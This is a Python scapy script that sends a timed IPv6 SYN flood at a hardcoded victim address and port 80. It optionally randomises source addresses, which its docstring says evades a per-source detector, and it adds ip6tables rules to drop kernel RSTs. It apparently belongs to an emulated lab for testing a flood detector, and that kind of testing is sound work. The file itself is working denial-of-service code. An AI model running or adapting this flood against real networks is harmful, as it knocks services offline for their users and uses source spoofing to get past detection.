"""
attack_short.py  --  SHORT IPv6 SYN flood (scapy, Layer-2 injection).

Sends SYNs as fast as possible for a few seconds, then stops. IPv6 only
(hping3 can't do IPv6). Run inside one attacker host's namespace.

    python3 attack_short.py [DURATION_SECONDS] [spoof]

  DURATION_SECONDS : how long to flood (default 3)
  spoof            : if given, randomise the source IPv6 (spoofed flood --
                     note: the per-source CMS detector will not catch this)
"""

import re, sys, time, random, subprocess
from scapy.all import Ether, IPv6, TCP, sendp
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

VICTIM_IP  = "2001:1:1::100"
VICTIM_MAC = "aa:00:00:00:00:00"
DST_PORT   = 80

DURATION = float(sys.argv[1]) if len(sys.argv) > 1 else 3.0
SPOOF    = (len(sys.argv) > 2 and sys.argv[2].lower() == 'spoof')

IPV6_MAP = {'h0': '2001:1:1::100'}
IPV6_MAP.update({f'h{i}': f'2001:1:1::{i:x}' for i in range(1, 61)})

subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
# drop kernel RSTs so the host doesn't cancel its own flood
subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)
subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp',
                '--tcp-flags', 'RST', 'RST', '-j', 'DROP'], capture_output=True)


def iface_info():
    out = subprocess.run(['ip', 'link'], capture_output=True, text=True).stdout
    iface = None
    for line in out.split('\n'):
        m = re.search(r'\d+:\s+([\w-]+eth\d+)', line)
        if m:
            iface = m.group(1); break
    if not iface:
        print("ERROR: no interface"); sys.exit(1)
    mac = re.search(r'link/ether ([0-9a-f:]+)',
                    subprocess.run(['ip', 'link', 'show', iface],
                                   capture_output=True, text=True).stdout).group(1)
    r = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True).stdout
    m6 = re.search(r'inet6 (2001[0-9a-f:]+)/\d+', r)
    if m6:
        ip6 = m6.group(1)
    else:
        host = iface.split('-eth')[0]
        ip6 = IPV6_MAP.get(host)
        subprocess.run(['ip', '-6', 'addr', 'add', 'nodad', ip6 + '/64', 'dev', iface],
                       capture_output=True)
    return iface, mac, ip6


def rand_src():
    return "2001:1:1::" + ":".join("%x" % random.randint(0, 0xffff) for _ in range(2))


iface, src_mac, src_ip = iface_info()
print(f"[attack_short] {src_ip} -> {VICTIM_IP}:{DST_PORT} for {DURATION}s"
      f"{' (SPOOFED src)' if SPOOF else ''}")

n = 0
t0 = time.time()
while time.time() - t0 < DURATION:
    s = rand_src() if SPOOF else src_ip
    pkt = (Ether(src=src_mac, dst=VICTIM_MAC) /
           IPv6(src=s, dst=VICTIM_IP) /
           TCP(sport=10000 + (n % 50000), dport=DST_PORT, flags="S", seq=1000 + n))
    sendp(pkt, iface=iface, verbose=0)
    n += 1

print(f"[attack_short] done: {n} SYNs in {time.time()-t0:.1f}s "
      f"({n/max(0.1, time.time()-t0):.0f} pps)")
